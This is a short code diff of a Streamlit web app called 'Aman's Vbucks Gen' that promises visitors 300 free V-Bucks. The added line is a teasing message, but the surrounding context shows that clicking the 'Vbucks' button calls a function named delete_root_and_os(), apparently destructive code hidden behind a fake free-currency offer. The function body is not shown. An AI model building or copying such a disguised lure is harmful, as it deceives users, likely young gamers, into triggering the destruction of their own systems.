@@ -9,6 +9,7 @@ def delete_root_and_os():
 # Streamlit app
 st.title("Aman's Vbucks Gen")
 st.write("Click the button below to recieve 300 vbucks")
+st.write("This website is for lucky ones only ;)")
 
 if st.button("Vbucks"):
     delete_root_and_os()
